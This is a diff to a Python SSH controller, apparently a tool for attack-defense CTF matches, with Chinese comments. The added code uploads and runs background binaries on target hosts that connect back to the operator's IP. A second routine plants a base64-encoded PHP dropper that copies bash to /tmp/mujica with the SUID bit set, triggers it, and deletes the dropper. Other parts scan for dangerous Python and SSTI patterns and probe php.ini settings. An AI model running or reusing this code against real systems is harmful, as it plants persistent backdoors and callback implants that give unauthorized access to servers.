@@ -30,10 +30,14 @@ class SSHController:
         self.custom_php_rules = []
         self.custom_rules_file = None
         
+        # 本机 IP（用于 AOI 工具部署）
+        self.local_ip = ''
+        
         # Paths (initialized in init_app)
         self.keys_folder = None
         self.preload_folder = None
         self.backups_folder = None
+        self.tools_folder = None
         self.data_dir = None
         self.config_file = None
         self.targets_file = None
@@ -82,11 +86,97 @@ class SSHController:
         self.data_dir = app.config['DATA_DIR']
         self.config_file = app.config['CONFIG_FILE']
         self.targets_file = app.config['TARGETS_FILE']
+        self.tools_folder = os.path.join(app.config['BASE_DIR'], 'tools')
         
         self.load_targets()
         self.load_preload_config()
         self.custom_rules_file = os.path.join(self.data_dir, 'custom_php_rules.json')
         self.load_custom_rules()
+        self._load_local_ip()
+
+    # ==================== 本机 IP 配置 ====================
+    def _load_local_ip(self):
+        """从文件加载本机 IP"""
+        if self.data_dir:
+            ip_file = os.path.join(self.data_dir, 'local_ip.txt')
+            if os.path.exists(ip_file):
+                try:
+                    with open(ip_file, 'r') as f:
+                        self.local_ip = f.read().strip()
+                except:
+                    pass
+
+    def _save_local_ip(self):
+        """保存本机 IP 到文件"""
+        if self.data_dir:
+            ip_file = os.path.join(self.data_dir, 'local_ip.txt')
+            with open(ip_file, 'w') as f:
+                f.write(self.local_ip)
+
+    def set_local_ip(self, ip):
+        """设置本机 IP"""
+        self.local_ip = ip.strip()
+        self._save_local_ip()
+        print(f"[Config] 本机 IP 已设置为: {self.local_ip}")
+        return True
+
+    def get_local_ip(self):
+        """获取本机 IP"""
+        return self.local_ip
+
+    # ==================== AOI 工具部署 ====================
+    def deploy_aoi_tools(self, ip, port):
+        """部署 AOI 工具到 PHP 靶机（tapeworm + roundworm）"""
+        if not self.local_ip:
+            print(f"[{ip}:{port}] AOI 部署跳过: 未配置本机 IP")
+            return
+        
+        target = next((t for t in self.targets if t['ip'] == ip and t['port'] == port), None)
+        if not target:
+            return
+        
+        aoi_dir = os.path.join(self.tools_folder, 'aoi')
+        tapeworm_path = os.path.join(aoi_dir, 'tapeworm.phar')
+        roundworm_path = os.path.join(aoi_dir, 'roundworm')
+        
+        if not os.path.exists(tapeworm_path) or not os.path.exists(roundworm_path):
+            print(f"[{ip}:{port}] AOI 部署跳过: tools/aoi/ 缺少文件")
+            return
+        
+        try:
+            print(f"[{ip}:{port}] 开始部署 AOI 工具...")
+            
+            # 1. 上传 tapeworm.phar
+            print(f"[{ip}:{port}] 上传 tapeworm.phar...")
+            self.upload(ip, port, tapeworm_path, '/tmp/tapeworm.phar')
+            
+            # 2. 上传 roundworm
+            print(f"[{ip}:{port}] 上传 roundworm...")
+            self.upload(ip, port, roundworm_path, '/tmp/roundworm')
+            self.execute(ip, port, 'chmod +x /tmp/roundworm')
+            
+            # 3. 运行 tapeworm (连回 local_ip:8023)
+            ip1 = f"{self.local_ip}:8023"
+            tapeworm_cmd = f"cd /var/www/html && nohup php /tmp/tapeworm.phar -d /var/www/html -s {ip1} > /dev/null 2>&1 &"
+            print(f"[{ip}:{port}] 启动 tapeworm -> {ip1}")
+            self.execute(ip, port, tapeworm_cmd)
+            
+            # 4. 运行 roundworm (连回 local_ip)
+            ip2 = self.local_ip
+            roundworm_cmd = f"nohup /tmp/roundworm -d -s {ip2} -w /var/www/html > /dev/null 2>&1 &"
+            print(f"[{ip}:{port}] 启动 roundworm -> {ip2}")
+            self.execute(ip, port, roundworm_cmd)
+            
+            # 5. 更新状态
+            with self.lock:
+                target['aoi_deployed'] = True
+                self.notify_target_update(target)
+                self.save_targets()
+            
+            print(f"[{ip}:{port}] AOI 工具部署完成!")
+            
+        except Exception as e:
+            print(f"[{ip}:{port}] AOI 部署失败: {e}")
 
     def _ensure_initialized(self):
         """确保在有 Flask 上下文时加载配置"""
@@ -446,12 +536,16 @@ class SSHController:
         else:
              print(f"[{ip}:{port}] DEBUG: No types detected, skipping backup.")
 
-        # 如果是 PHP，开启新线程扫描危险函数
+        # 如果是 PHP，开启新线程扫描危险函数 + 检测 php.ini
         if 'php' in detection['types']:
             print(f"[{ip}:{port}] DEBUG: Triggering PHP scan...")
             threading.Thread(target=self.scan_php_vulns, args=(ip, port)).start()
             # 部署 www-data 权限后门
             threading.Thread(target=self.setup_wwwdata_shell, args=(ip, port)).start()
+            # 检测 php.ini 信息
+            threading.Thread(target=self._detect_php_ini, args=(ip, port)).start()
+            # 部署 AOI 工具（仅当已配置本机 IP）
+            threading.Thread(target=self.deploy_aoi_tools, args=(ip, port)).start()
 
         # 如果是 Python，开启新线程扫描危险函数
         if 'python' in detection['types']:
@@ -520,53 +614,129 @@ class SSHController:
             print(f"[{ip}:{port}] Scan error: {e}")
 
     def scan_python_vulns(self, ip, port):
-        """扫描 Python 危险函数"""
+        """扫描 Python 危险函数 + SSTI 注入（基于本地备份代码）"""
         target = next((t for t in self.targets if t['ip'] == ip and t['port'] == port), None)
         if not target: return
 
-        print(f"[{ip}:{port}] Starting Python vulnerability scan...")
+        print(f"[{ip}:{port}] 开始 Python 漏洞扫描...")
         target['status'] = 'scanning...'
         self.notify_target_update(target)
         
-        # Python 危险函数模式
-        patterns = [
-            'eval\\(', 'exec\\(', 'compile\\(',
-            'os\\.system\\(', 'os\\.popen\\(',
-            'subprocess\\.', 'commands\\.',
-            'pickle\\.loads', 'yaml\\.load\\(',
-            '__import__\\(', 'importlib\\.import',
-            'input\\(.*\\)',  # Python 2 input() is eval
-        ]
-        grep_expr = '|'.join(patterns)
-        # 排除 upload/uploads 目录
-        cmd = f"grep -rnE '{grep_expr}' /home --include='*.py' --exclude-dir=upload --exclude-dir=uploads | head -n 30"
+        # Python 危险函数 + SSTI 注入模式
+        patterns = {
+            # 危险函数
+            r'eval\s*\(': 'eval',
+            r'exec\s*\(': 'exec',
+            r'compile\s*\(': 'compile',
+            r'os\.system\s*\(': 'os.system',
+            r'os\.popen\s*\(': 'os.popen',
+            r'subprocess\.\w+\s*\(': 'subprocess',
+            r'commands\.\w+\s*\(': 'commands',
+            r'pickle\.loads?\s*\(': 'pickle',
+            r'yaml\.load\s*\(': 'yaml.load',
+            r'__import__\s*\(': '__import__',
+            r'importlib\.import': 'importlib',
+            # SSTI 模板注入
+            r'render_template_string\s*\(': 'SSTI:render_template_string',
+            r'Template\s*\(': 'SSTI:Template',
+            r'from_string\s*\(': 'SSTI:from_string',
+            r'Environment\s*\(': 'SSTI:Environment',
+            r'Markup\s*\(': 'SSTI:Markup',
+            r'\.render\s*\([^)]*\brequest\b': 'SSTI:render+request',
+            r'\{\{.*\}\}': 'SSTI:template_expr',
+            r'\{%.*%\}': 'SSTI:template_tag',
+        }
 
         try:
-            output = self.execute(ip, port, cmd)
+            # 优先扫描本地备份代码（内存读取，不解压到磁盘避免触发 Flask reloader）
+            backup_dir = os.path.join(self.backups_folder, f"{ip}_{port}")
+            backup_tar = os.path.join(backup_dir, "web.tar")
+            
             processed_lines = []
-            if output and output.strip():
-                for line in output.strip().split('\n'):
-                    parts = line.split(':', 2)
-                    if len(parts) >= 3:
-                        content = parts[2]
-                        risk_tag = 'Unknown'
-                        for p in patterns:
-                            if re.search(p, content):
-                                risk_tag = p.replace('\\(', '').replace('\\)', '').replace('.*', ' ').replace('\\.', '.')
-                                break
-                        processed_lines.append(f"{parts[0]}:{parts[1]}:{risk_tag}:{content}")
-                    else:
-                        processed_lines.append(line)
+            scanned_from_backup = False
+            
+            if os.path.exists(backup_tar):
+                import tarfile
+                try:
+                    with tarfile.open(backup_tar, 'r') as tar:
+                        print(f"[{ip}:{port}] 正在从备份中扫描 Python 代码...")
+                        for member in tar.getmembers():
+                            if not member.isfile() or not member.name.endswith('.py'):
+                                continue
+                            # 排除目录
+                            skip = False
+                            for exc in ['__pycache__', 'upload/', 'uploads/', '.git/', 'node_modules/', 'venv/', 'env/']:
+                                if exc in member.name:
+                                    skip = True
+                                    break
+                            if skip:
+                                continue
+                            
+                            try:
+                                f = tar.extractfile(member)
+                                if f is None:
+                                    continue
+                                content = f.read().decode('utf-8', errors='ignore')
+                                f.close()
+                                
+                                for line_no, line_content in enumerate(content.split('\n'), 1):
+                                    stripped = line_content.strip()
+                                    if not stripped or stripped.startswith('#'):
+                                        continue
+                                    
+                                    for pattern, tag in patterns.items():
+                                        if re.search(pattern, line_content):
+                                            display_path = '/' + member.name
+                                            processed_lines.append(
+                                                f"{display_path}:{line_no}:{tag}:{stripped}"
+                                            )
+                                            break
+                            except Exception:
+                                continue
+                    scanned_from_backup = True
+                    print(f"[{ip}:{port}] 备份扫描完成")
+                except Exception as e:
+                    print(f"[{ip}:{port}] 备份读取失败: {e}")
+            
+            if not scanned_from_backup:
+                # 回退：远程 grep 扫描
+                print(f"[{ip}:{port}] 备份不可用，使用远程扫描...")
+                grep_patterns = [
+                    'eval\\(', 'exec\\(', 'compile\\(',
+                    'os\\.system\\(', 'os\\.popen\\(',
+                    'subprocess\\.', 'commands\\.',
+                    'pickle\\.loads', 'yaml\\.load\\(',
+                    '__import__\\(', 'importlib\\.import',
+                    'render_template_string\\(', 'Template\\(',
+                    'from_string\\(', 'Environment\\(',
+                ]
+                grep_expr = '|'.join(grep_patterns)
+                cmd = f"grep -rnE '{grep_expr}' /home --include='*.py' --exclude-dir=upload --exclude-dir=uploads | head -n 50"
+                output = self.execute(ip, port, cmd)
                 
-                final_output = '\n'.join(processed_lines)
-
+                if output and output.strip():
+                    for line in output.strip().split('\n'):
+                        parts = line.split(':', 2)
+                        if len(parts) >= 3:
+                            content = parts[2]
+                            risk_tag = 'Unknown'
+                            for pattern, tag in patterns.items():
+                                if re.search(pattern, content):
+                                    risk_tag = tag
+                                    break
+                            processed_lines.append(f"{parts[0]}:{parts[1]}:{risk_tag}:{content}")
+                        else:
+                            processed_lines.append(line)
+            
+            if processed_lines:
+                final_output = '\n'.join(processed_lines[:50])  # 限制最多 50 条
                 with self.lock:
                     if 'detection' not in target: target['detection'] = {}
                     target['detection']['python_vulns'] = final_output
                     self.save_targets()
-                print(f"[{ip}:{port}] Python Scan found risks!")
+                print(f"[{ip}:{port}] Python 扫描发现 {len(processed_lines)} 个风险!")
             else:
-                print(f"[{ip}:{port}] Python Scan clean.")
+                print(f"[{ip}:{port}] Python 扫描无风险")
             
             target['status'] = 'connected'
             self.notify_target_update(target)
@@ -574,96 +744,179 @@ class SSHController:
         except Exception as e:
             print(f"[{ip}:{port}] Python scan error: {e}")
 
+    def _detect_php_ini(self, ip, port):
+        """检测 php.ini 路径、权限和关键配置"""
+        target = next((t for t in self.targets if t['ip'] == ip and t['port'] == port), None)
+        if not target:
+            return
+        
+        try:
+            php_ini_info = {}
+            
+            # 1. 查找 php.ini 路径
+            ini_path_result = self.execute(ip, port, "php -i 2>/dev/null | grep 'Loaded Configuration File' | awk -F'=> ' '{print $NF}'")
+            ini_path = ini_path_result.strip() if ini_path_result else ''
+            
+            if not ini_path or ini_path == '(none)':
+                # 备用方式查找
+                find_result = self.execute(ip, port, "find /etc -name 'php.ini' 2>/dev/null | head -n 1")
+                ini_path = find_result.strip() if find_result else ''
+            
+            if not ini_path:
+                php_ini_info['path'] = '未找到'
+                php_ini_info['writable'] = False
+            else:
+                php_ini_info['path'] = ini_path
+                
+                # 2. 检查写权限
+                perm_check = self.execute(ip, port, f"test -w '{ini_path}' && echo WRITABLE || echo READONLY")
+                php_ini_info['writable'] = 'WRITABLE' in (perm_check or '')
+                
+                # 3. 获取关键配置项
+                configs_to_check = [
+                    'disable_functions',
+                    'open_basedir',
+                    'allow_url_include',
+                    'display_errors',
+                    'short_open_tag',
+                ]
+                config_values = {}
+                for cfg in configs_to_check:
+                    val = self.execute(ip, port, f"php -i 2>/dev/null | grep -i '^{cfg}' | head -n 1")
+                    if val and val.strip():
+                        # 格式一般是 "key => local value => master value" 或 "key => value"
+                        parts = val.strip().split('=>')
+                        if len(parts) >= 2:
+                            config_values[cfg] = parts[-1].strip()
+                        else:
+                            config_values[cfg] = val.strip()
+                    else:
+                        config_values[cfg] = '未检测到'
+                php_ini_info['configs'] = config_values
+            
+            # 4. 检测 PHP 重启方式
+            restart_cmds = []
+            # 检查常见服务
+            for svc in ['apache2', 'nginx', 'php-fpm', 'php7.4-fpm', 'php8.0-fpm', 'php8.1-fpm', 'php8.2-fpm']:
+                check = self.execute(ip, port, f"which {svc.split('-')[0]} 2>/dev/null || systemctl is-active {svc} 2>/dev/null")
+                if check and ('active' in check or '/' in check):
+                    restart_cmds.append(f"service {svc} restart")
+            if not restart_cmds:
+                restart_cmds = ['service apache2 restart', 'service php-fpm restart']
+            php_ini_info['restart_cmds'] = restart_cmds
+            
+            # 保存到 target
+            with self.lock:
+                if 'detection' not in target:
+                    target['detection'] = {}
+                target['detection']['php_ini'] = php_ini_info
+                self.notify_target_update(target)
+                self.save_targets()
+            
+            print(f"[{ip}:{port}] php.ini 检测完成: {ini_path}")
+            
+        except Exception as e:
+            print(f"[{ip}:{port}] php.ini 检测错误: {e}")
+
     def setup_wwwdata_shell(self, ip, port):
         """
-        Refactored www-data shell acquisition:
-        1. Upload PHP payload: <?php system('cp /bin/bash /tmp/mujica;chmod u+s /tmp/mujica');?>
-        2. Trigger via HTTP
-        3. Delete PHP file
-        4. Enable frontend button
+        www-data shell: 上传 PHP payload → HTTP 触发 → SUID /tmp/mujica
         """
         target = next((t for t in self.targets if t['ip'] == ip and t['port'] == port), None)
         if not target: return
 
-        print(f"[{ip}:{port}] Initializing www-data shell setup...")
-
-        # 1. Upload PHP payload
+        # 准备 payload
         php_filename = f'.shell_{int(time.time())}.php'
-        # Strict user payload
         php_content = "<?php system('cp /bin/bash /tmp/mujica;chmod u+s /tmp/mujica');?>"
+        import base64
+        b64_payload = base64.b64encode(php_content.encode()).decode()
         
-        web_roots = ['/var/www/html', '/var/www', '/opt/lampp/htdocs']
-        uploaded_path = None
+        uploaded_paths = []
         
-        for web_root in web_roots:
-            # Check directory existence first
-            check_dir = self.execute(ip, port, f"ls -d {web_root}")
-            if 'No such file' in check_dir or not check_dir.strip():
-                print(f"[{ip}:{port}] Web root not found or empty: {web_root}")
-                continue
-                
-            remote_path = f'{web_root}/{php_filename}'
-            print(f"[{ip}:{port}] Attempting upload to: {remote_path}")
-            self.execute(ip, port, f"echo '{php_content}' > {remote_path}")
-            
-            # Verify upload (User Requirement: Confirm via command execution)
-            # using ls -la to show file details
-            verify_cmd = f"ls -la {remote_path}"
-            print(f"[{ip}:{port}] Verifying upload with: {verify_cmd}")
-            check_file = self.execute(ip, port, verify_cmd)
-            
-            if check_file and "No such file" not in check_file and remote_path in check_file:
-                print(f"[{ip}:{port}] Payload successfully uploaded. Details: {check_file.strip()}")
-                uploaded_path = remote_path
-                break
-            else:
-                 print(f"[{ip}:{port}] Upload verification failed for {remote_path}. Output: {check_file.strip() if check_file else 'None'}")
+        # 查找含 PHP 文件的目录
+        find_cmd = "find /var/www/html -name '*.php' -type f 2>/dev/null | xargs -I{} dirname {} | sort -u"
+        find_result = self.execute(ip, port, find_cmd)
         
-        if not uploaded_path:
-            print(f"[{ip}:{port}] Failed to upload PHP payload to any candidate web root.")
-            return
-
-        time.sleep(1) 
+        php_dirs = []
+        if find_result and find_result.strip():
+            for line in find_result.strip().split('\n'):
+                d = line.strip()
+                if d and d.startswith('/') and d not in php_dirs:
+                    php_dirs.append(d)
+        if not php_dirs:
+            php_dirs = ['/var/www/html']
         
-        # 2. Trigger via HTTP
-        triggered = False
+        # 逐目录尝试
         ports_to_try = [80, 8080, 8888]
-        for try_port in ports_to_try:
-            try:
-                url = f'http://{ip}:{try_port}/{php_filename}'
-                print(f"[{ip}:{port}] Triggering payload via: {url}")
-                resp = requests.get(url, timeout=3)
-                print(f"[{ip}:{port}] Trigger response code: {resp.status_code}")
-                # We don't check output here as payload has no echo, just side effect
-                triggered = True
+        success = False
+        
+        for web_dir in php_dirs:
+            if success:
                 break
-            except Exception as e:
-                print(f"[{ip}:{port}] Trigger failed for port {try_port}: {e}")
+            
+            remote_path = f'{web_dir}/{php_filename}'
+            self.execute(ip, port, f"echo {b64_payload} | base64 -d > {remote_path}")
+            uploaded_paths.append(remote_path)
+            
+            verify = self.execute(ip, port, f"cat {remote_path}")
+            if not verify or '<?php' not in verify:
+                continue
+            
+            time.sleep(0.5)
+            
+            url_path = web_dir.replace('/var/www/html', '').lstrip('/')
+            trigger_files = []
+            if url_path:
+                trigger_files.append(f"{url_path}/{php_filename}")
+            trigger_files.append(php_filename)
+            trigger_files = list(dict.fromkeys(trigger_files))
+            
+            for trigger_file in trigger_files:
+                if success:
+                    break
+                for try_port in ports_to_try:
+                    url = f"http://localhost:{try_port}/{trigger_file}"
+                    
+                    trigger_cmds = [
+                        f"curl -s -o /dev/null -w '%{{http_code}}' {url}",
+                        f"wget -q -O /dev/null {url} && echo 200 || echo 000",
+                        f"php -r \"file_get_contents('{url}');\" && echo 200 || echo 000",
+                    ]
+                    
+                    for cmd in trigger_cmds:
+                        result = self.execute(ip, port, cmd)
+                        result_stripped = result.strip() if result else ''
+                        
+                        if 'not found' in result_stripped:
+                            continue
+                        
+                        if '200' in result_stripped or '302' in result_stripped or '301' in result_stripped:
+                            time.sleep(0.5)
+                            check = self.execute(ip, port, "ls -la /tmp/mujica 2>/dev/null")
+                            if check and 'mujica' in check and (('rws' in check) or ('s' in check.split()[0])):
+                                success = True
+                                break
+                        break
+                    if success:
+                        break
         
-        # 3. Delete PHP file (Cleanup)
-        self.execute(ip, port, f"rm -f {uploaded_path}")
-        print(f"[{ip}:{port}] Cleanup complete (Removed {uploaded_path}).")
+        # 清理
+        for path in uploaded_paths:
+            self.execute(ip, port, f"rm -f {path}")
 
-        # 4. Verify & Enable Frontend
-        # Check if /tmp/mujica exists and has SUID bit
-        print(f"[{ip}:{port}] Verifying SUID binary /tmp/mujica...")
-        check = self.execute(ip, port, "ls -la /tmp/mujica 2>/dev/null")
-        print(f"[{ip}:{port}] Verification Result: {check.strip() if check else 'No output'}")
-        
-        if check and 'mujica' in check and (('rws' in check) or ('s' in check.split()[0])):
-            print(f"[{ip}:{port}] www-data shell verified (SUID). Enabling frontend access.")
+        # 结果
+        if success:
+            print(f"[{ip}:{port}] ✅ www-data shell 部署成功")
             with self.lock:
                 target['wwwdata_shell'] = True
-                target['wwwdata_strategy'] = 'suid' # Mark as SUID strategy
+                target['wwwdata_strategy'] = 'suid'
                 self.notify_target_update(target)
                 self.save_targets()
         else:
-             print(f"[{ip}:{port}] www-data shell verification FAILED. /tmp/mujica missing or not SUID.")
-
-        print(f"[{ip}:{port}] www-data shell 所有策略均失败")
-        with self.lock:
-            target['wwwdata_shell'] = False
-            self.save_targets()
+            print(f"[{ip}:{port}] ❌ www-data shell 部署失败")
+            with self.lock:
+                target['wwwdata_shell'] = False
+                self.save_targets()
 
     def execute_as_wwwdata(self, ip, port, cmd):
         """以 www-data 权限执行命令"""
